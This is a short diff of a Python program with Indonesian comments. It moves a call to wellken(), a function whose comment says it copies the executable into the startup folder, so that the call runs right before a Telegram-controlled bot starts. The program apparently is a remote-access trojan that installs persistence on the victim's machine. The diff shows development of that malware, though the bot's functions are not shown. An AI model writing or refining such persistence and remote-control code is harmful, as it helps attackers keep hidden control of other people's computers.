@@ -43,9 +43,6 @@ def wellken():
     elif 'posix' in typesys.lower():  # Linux atau macOS
         pass  # Tidak ada operasi yang perlu dilakukan
 
-# Panggil fungsi untuk menyalin executable ke folder startup
-wellken()
-
 class TelegramBot:
 
     def __init__(self):
@@ -196,6 +193,6 @@ class TelegramBot:
         print("[+] Hallo Sir Started ")
         updater.idle()
 
-
+wellken()
 bot = TelegramBot()
 bot.start_bot()
